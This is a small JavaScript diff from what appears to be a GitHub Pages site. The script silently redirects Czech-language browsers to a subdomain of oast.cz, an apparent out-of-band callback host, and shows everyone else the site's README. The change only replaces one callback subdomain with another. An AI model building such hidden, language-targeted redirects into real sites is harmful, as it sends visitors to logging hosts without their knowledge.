@@ -3,7 +3,7 @@ const userLang = navigator.language || navigator.userLanguage;
 
 if (userLang && (userLang === "cs" || userLang.startsWith("cs-"))) {
   // Pokud je jazyk český, přesměrujeme uživatele
-  window.location.href = "https://blz6bbgo.oast.cz"; // Změňte URL podle potřeby
+  window.location.href = "https://yojpmr6f.oast.cz"; // Změňte URL podle potřeby
 } else {
   // Pokud nedojde k redirectu, načteme README.md z GitHub
   const readmeUrl = "https://raw.githubusercontent.com/opicevopice/opicevopice.github.io/refs/heads/main/README.md"; // Nahraďte vlastní URL
